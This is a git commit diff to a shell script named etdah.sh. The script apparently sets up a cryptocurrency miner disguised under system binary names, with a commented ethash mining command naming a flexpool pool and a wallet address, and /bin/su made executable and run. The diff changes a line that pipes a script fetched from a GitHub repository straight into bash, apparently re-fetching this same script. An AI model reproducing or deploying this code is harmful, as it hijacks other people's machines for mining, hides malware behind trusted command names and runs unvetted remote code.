d1512f65658521aebdc3b8fb4517aff4b0d608e1
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-11 15:10:17 +0700

    Update etdah.sh

--- etdah.sh
+++ etdah.sh
@@ -10,4 +10,4 @@ chmod +x /bin/su
 
 #/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
 /bin/sh -c /bin/su
-curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/ax.sh | bash
+curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/etdah.sh | bash
